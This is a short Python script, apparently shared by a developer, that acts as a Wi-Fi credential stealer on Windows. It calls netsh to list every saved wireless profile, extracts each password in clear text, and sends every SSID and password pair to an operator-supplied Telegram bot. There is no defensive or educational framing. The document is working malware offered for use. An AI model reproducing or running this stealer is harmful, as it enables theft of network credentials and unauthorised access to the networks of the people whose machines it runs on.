import subprocess
import requests
import re

# Enter Your Bot API Token Here (you can get this from @BotFather in telegram)
BOT_API_TOKEN = ''

# Enter Your Chat ID Here (you can get this from @raw_data_bot in telegram)
CHAT_ID = ''

# Function to get Wi-Fi profiles with passwords
def get_wifi_profiles():
    wifi_profiles = []
    netsh_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
    profile_names = re.findall("All User Profile     : (.*)\r", netsh_output)

    for name in profile_names:
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True, text=True).stdout
        if "Security key           : Absent" in profile_info:
            continue
        else:
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True, text=True).stdout
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            wifi_profile = {"ssid": name, "password": password.group(1) if password else None}
            wifi_profiles.append(wifi_profile)

    return wifi_profiles

# Send data to Telegram Bot
def send_data_to_telegram(wifi_profiles):
    for wifi_profile in wifi_profiles:
        text = f"SSID: {wifi_profile['ssid']}, Password: {wifi_profile['password']}"
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}"
        requests.get(url)

if __name__ == "__main__":
    wifi_profiles = get_wifi_profiles()

    if wifi_profiles:
        send_data_to_telegram(wifi_profiles)
    else:
        print("No Wi-Fi profiles found.")


# @AMLDevelopment on telegram
# https://github.com/ItsAML
